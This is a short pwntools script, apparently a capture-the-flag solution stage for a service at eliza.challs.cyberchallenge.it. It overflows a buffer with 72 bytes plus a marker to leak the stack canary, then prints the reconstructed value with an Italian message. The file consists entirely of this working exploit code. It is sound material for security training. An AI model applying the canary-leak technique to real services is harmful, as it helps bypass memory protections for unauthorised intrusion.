from pwn import *
r=remote('eliza.challs.cyberchallenge.it', 9131)

payload_leak=b"A"*72+b"B"

r.sendlineafter(b"Ask me anything...", payload_leak)

r.recvuntil(b"B")
canary_leak=r.recv(7)

canary=b"\x00"+canary_leak

print(f"[+] Canarino catturato: {hex(u64(canary))}")

